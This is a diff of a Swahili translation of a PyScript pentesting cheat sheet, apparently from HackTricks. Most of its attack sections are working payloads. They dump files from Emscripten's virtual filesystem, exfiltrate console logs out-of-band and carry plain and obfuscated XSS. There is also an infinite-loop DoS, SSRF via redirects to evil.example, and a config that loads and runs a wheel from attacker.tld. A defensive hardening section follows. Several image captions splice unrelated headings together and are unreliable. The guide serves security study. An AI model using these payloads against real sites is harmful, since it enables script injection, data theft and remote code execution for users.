@@ -4,11 +4,11 @@
 
 ## Mwongozo wa PyScript Pentesting
 
-PyScript ni mfumo mpya ulioandaliwa kwa ajili ya kuunganisha Python katika HTML ili, iweze kutumika pamoja na HTML. Katika karatasi hii ya udanganyifu, utaona jinsi ya kutumia PyScript kwa madhumuni yako ya kupenya.
+PyScript ni framework mpya iliyoundwa kwa ajili ya kuunganisha Python kwenye HTML, hivyo inaweza kutumika pamoja na HTML. Katika cheat sheet hii, utapata jinsi ya kutumia PyScript kwa madhumuni yako ya penetration testing.
 
-### Kutupa / Kurejesha faili kutoka kwenye mfumo wa faili wa kumbukumbu wa Emscripten:
+### Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem:
 
-`CVE ID: CVE-2022-30286`\
+`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
 \
 Code:
 ```html
@@ -17,11 +17,13 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 = fin.read() print(out)
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
+Result:
 
-### [OOB Data Exfiltration ya mfumo wa faili wa kumbukumbu wa Emscripten (uangalizi wa console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+![PyScript Pentesting Guide - Kuhifadhi / Kupata faili kutoka kwenye Emscripten virtual memory filesystem: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-`CVE ID: CVE-2022-30286`\
+### [OOB Data Exfiltration of the Emscripten virtual memory filesystem (ufuatiliaji wa console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+
+`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
 \
 Code:
 ```html
@@ -45,7 +47,9 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ')
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
+Matokeo:
+
+![Dumping / Retrieving files kutoka kwenye Emscripten virtual memory filesystem - OOB Data Exfiltration ya Emscripten virtual memory filesystem (ufuatiliaji wa console): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
 ### Cross Site Scripting (Kawaida)
 
@@ -55,7 +59,9 @@ Code:
 print("<img src=x onerror='alert(document.domain)'>")
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
+Matokeo:
+
+![Utoaji wa data wa OOB wa mfumo wa faili wa kumbukumbu pepe wa Emscripten (ufuatiliaji wa console) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)
 
 ### Cross Site Scripting (Python Obfuscated)
 
@@ -71,11 +77,13 @@ y = "o";m = "ner";z = "ror\u003d"
 print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
+Matokeo:
+
+![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)
 
 ### Cross Site Scripting (JavaScript Obfuscation)
 
-Code:
+Msimbo:
 ```html
 <py-script>
 prinht(""
@@ -143,9 +151,11 @@ return _0x599c()
 "")
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+Result:
 
-### Shambulio la DoS (Mzunguko wa Usoni)
+![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
+
+### DoS attack (Infinity loop)
 
 Code:
 ```html
@@ -154,15 +164,17 @@ while True:
 print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
 </py-script>
 ```
-![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+Matokeo:
+
+![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
 
 ---
 
-## Uthibitisho mpya & mbinu (2023-2025)
+## Udhaifu na mbinu mpya (2023-2025)
 
-### Server-Side Request Forgery kupitia upitisho usio na udhibiti (CVE-2025-50182)
+### Server-Side Request Forgery kupitia redirects zisizodhibitiwa (CVE-2025-50182)
 
-`urllib3 < 2.5.0` inapuuzilia mbali vigezo vya `redirect` na `retries` wakati inatekelezwa **ndani ya mazingira ya Pyodide** yanayokuja na PyScript. Wakati mshambuliaji anaweza kuathiri URL za lengo, wanaweza kulazimisha msimbo wa Python kufuata upitisho wa kuvuka maeneo hata wakati mbunifu amezuia waziwazi ‑ kwa ufanisi kuzunguka mantiki ya kupambana na SSRF.
+`urllib3 < 2.5.0` hupuuza vigezo vya `redirect` na `retries` inapoendeshwa **ndani ya Pyodide runtime** inayokuja na PyScript. Wakati mshambuliaji anaweza kudhibiti URL lengwa, anaweza kulazimisha code ya Python kufuata redirects za cross-domain hata kama developer alizizima waziwazi ‑ hivyo kupita kwa ufanisi mantiki ya kuzuia anti-SSRF.<sup>[[1]](#references)</sup>
 ```html
 <script type="py">
 import urllib3
@@ -171,11 +183,11 @@ r = http.request("GET", "https://evil.example/302")      # will STILL follow the
 print(r.status, r.url)
 </script>
 ```
-Imepatikana katika `urllib3 2.5.0` – sasisha kifurushi katika picha yako ya PyScript au weka toleo salama katika `packages = ["urllib3>=2.5.0"]`. Tazama kuingia rasmi kwa CVE kwa maelezo zaidi.
+Imewekwa patch katika `urllib3 2.5.0` – sasisha package kwenye PyScript image yako au weka toleo salama kwa `packages = ["urllib3>=2.5.0"]`. Tazama CVE entry rasmi kwa maelezo zaidi.
 
-### Upakiaji wa kifurushi bila mpangilio & mashambulizi ya mnyororo wa usambazaji
+### Arbitrary package loading & supply-chain attacks
 
-Kwa kuwa PyScript inaruhusu URL zisizo na mpangilio katika orodha ya `packages`, mhusika mbaya ambaye anaweza kubadilisha au kuingiza usanidi anaweza kutekeleza **Python isiyo na mpangilio kabisa** katika kivinjari cha mwathirika:
+Kwa kuwa PyScript inaruhusu URLs za kiholela katika orodha ya `packages`, mshambuliaji mwenye uwezo wa kubadilisha au kuingiza configuration anaweza kutekeleza **Python ya kiholela kabisa** kwenye browser ya mwathiriwa:
 ```html
 <py-config>
 packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
@@ -184,12 +196,12 @@ packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
 import payload  # executes attacker-controlled code during installation
 </script>
 ```
-*Ni magurudumu ya pure-Python pekee yanahitajika – hakuna hatua ya uundaji wa WebAssembly inayohitajika.* Hakikisha usanidi hauwezi kudhibitiwa na mtumiaji na mwenyeji wa magurudumu ya kuaminika kwenye eneo lako mwenyewe kwa HTTPS & SRI hashes.
+*Wheels za pure-Python pekee ndizo zinazohitajika – hakuna hatua ya WebAssembly compilation inayohitajika.* Hakikisha configuration haidhibitiwi na user na uhifadhi wheels zinazoaminika kwenye domain yako mwenyewe yenye HTTPS na SRI hashes.
 
-### Mabadiliko ya usafi wa matokeo (2023+)
+### Mabadiliko ya output sanitisation (2023+)
 
-* `print()` bado inaingiza HTML safi na kwa hivyo ni hatari ya XSS (mfano hapo juu).
-* Msaada mpya wa `display()` **huondoa HTML kwa chaguo-msingi** – alama safi lazima iwekwe ndani ya `pyscript.HTML()`.
+* `print()` bado huingiza raw HTML na hivyo iko hatarini kwa XSS (mifano iko hapo juu).
+* Helper mpya ya `display()` hu-escape HTML kwa chaguomsingi – raw markup lazima ifungwe katika `pyscript.HTML()`.
 ```python
 from pyscript import display, HTML
 
@@ -197,21 +209,22 @@ display("<b>escaped</b>")          # renders literally
 
 display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
 ```
-Hali hii ilianzishwa mwaka 2023 na imeandikwa katika mwongozo rasmi wa Built-ins. Tegemea `display()` kwa pembejeo zisizoaminika na epuka kuita `print()` moja kwa moja.
+Tabia hii ilianzishwa mwaka 2023 na imeandikwa katika mwongozo rasmi wa Built-ins. Tumia `display()` kwa ingizo lisiloaminika na epuka kuita `print()` moja kwa moja.<sup>[[2]](#references)</sup>
 
 ---
 
-## Mbinu Bora za Kijihifadhi
+## Mbinu Bora za Kujilinda
 
-* **Sasisha pakiti** – panda hadi `urllib3 >= 2.5.0` na mara kwa mara jenga tena magurudumu yanayokuja na tovuti.
-* **Punguza vyanzo vya pakiti** – rejelea majina ya PyPI au URLs za asili moja, bora zaidi zilizo na ulinzi wa Sub-resource Integrity (SRI).
-* **Imarisha Sera ya Usalama wa Maudhui** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili vizuizi vya `<script>` vilivyoingizwa visiweze kutekelezwa.
-* **Kataza lebo za mtumiaji `<py-script>` / `<script type="py">`** – safisha HTML kwenye seva kabla ya kuirudisha kwa watumiaji wengine.
-* **Tenga wafanyakazi** – ikiwa huhitaji ufikiaji wa synchronous kwa DOM kutoka kwa wafanyakazi, wezesha bendera ya `sync_main_only` ili kuepuka mahitaji ya kichwa cha `SharedArrayBuffer`.
+* **Sasisha packages mara kwa mara** – sasisha hadi `urllib3 >= 2.5.0` na ujenge upya mara kwa mara wheels zinazosafirishwa pamoja na tovuti.
+* **Punguza vyanzo vya packages** – rejelea tu majina ya PyPI au URLs za same-origin, ikiwezekana zikiwa zimelindwa kwa Sub-resource Integrity (SRI).
+* **Imarisha Content Security Policy** – kataza JavaScript ya ndani (`script-src 'self' 'sha256-…'`) ili blocks za `<script>` zilizoingizwa zisiweze kutekelezwa.
+* **Kataza tags za `<py-script>` / `<script type="py">` zinazotolewa na mtumiaji** – safisha HTML kwenye server kabla ya kuirudisha kwa watumiaji wengine.
+* **Tenga workers** – ikiwa huhitaji workers kufikia DOM kwa usawazishaji, wezesha flag ya `sync_main_only` ili kuepuka mahitaji ya headers za `SharedArrayBuffer`.
 
-## Marejeleo
+## Marejeo
 
-* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
-* [Dokumenti za Built-ins za PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+- [2] [PyScript Built-ins documentation – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
+- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 {{#include ../../banners/hacktricks-training.md}}
